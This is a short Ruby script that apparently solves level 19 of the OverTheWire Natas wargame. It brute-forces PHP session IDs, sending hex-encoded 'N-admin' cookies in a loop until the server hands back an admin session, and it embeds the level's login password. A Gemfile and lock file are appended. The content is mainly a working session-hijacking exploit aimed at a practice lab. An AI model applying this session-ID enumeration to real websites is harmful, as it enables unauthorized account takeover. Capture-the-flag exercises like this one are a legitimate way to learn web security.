#!/usr/bin/env duct

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = { user: "natas19", password: "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" }
non_admin = "Login as an admin to retrieve credentials for natas20."
for i in 0..640
  php_sess_id = "#{i}-admin"
  php_sess_id_hex = php_sess_id.to_hex_string(false)
  puts i
  puts php_sess_id
  puts php_sess_id_hex
  response = Unirest.post url, auth: auth,
               headers: { "Cookie" => "PHPSESSID=#{php_sess_id_hex}" }
  unless response.body.include? non_admin
    puts response.body
    break
  end
end


__END__
@@ Gemfile.lock
GEM
  remote: https://rubygems.org/
  specs:
    addressable (2.3.8)
    hex_string (1.0.1)
    json (1.8.3)
    mime-types (1.25.1)
    rest-client (1.6.9)
      mime-types (~> 1.16)
    unirest (1.1.2)
      addressable (~> 2.3.5)
      json (~> 1.8.1)
      rest-client (~> 1.6.7)

PLATFORMS
  ruby

DEPENDENCIES
  hex_string
  unirest

BUNDLED WITH
   1.10.4
@@ Gemfile
source 'https://rubygems.org'
gem 'hex_string'
gem 'unirest'